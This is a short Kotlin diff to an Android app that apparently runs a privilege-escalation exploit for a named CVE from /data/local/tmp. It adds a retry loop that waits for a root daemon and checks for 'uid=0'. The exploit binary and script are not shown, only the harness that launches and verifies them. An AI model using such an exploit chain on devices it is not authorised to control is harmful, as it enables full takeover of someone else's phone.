@@ -205,11 +205,17 @@ class MainActivity : AppCompatActivity() {
                 shellRun(client, "sh /data/local/tmp/root.sh")
 
                 logApp("\n[*] Verifying root…\n")
-                val sb = StringBuilder()
-                client.shellExec(
-                    "/data/local/tmp/cve-2026-43499-root -c 'id'"
-                ) { sb.append(it) }
-                val id = sb.toString()
+                var id = ""
+                for (attempt in 1..5) {
+                    val sb = StringBuilder()
+                    client.shellExec(
+                        "/data/local/tmp/cve-2026-43499-root -c 'id'"
+                    ) { sb.append(it) }
+                    id = sb.toString()
+                    if ("uid=0" in id) break
+                    logApp("[*] Waiting for root daemon (attempt $attempt/5)…\n")
+                    Thread.sleep(2000)
+                }
                 logApp("[*] $id\n")
 
                 if ("uid=0" in id) {
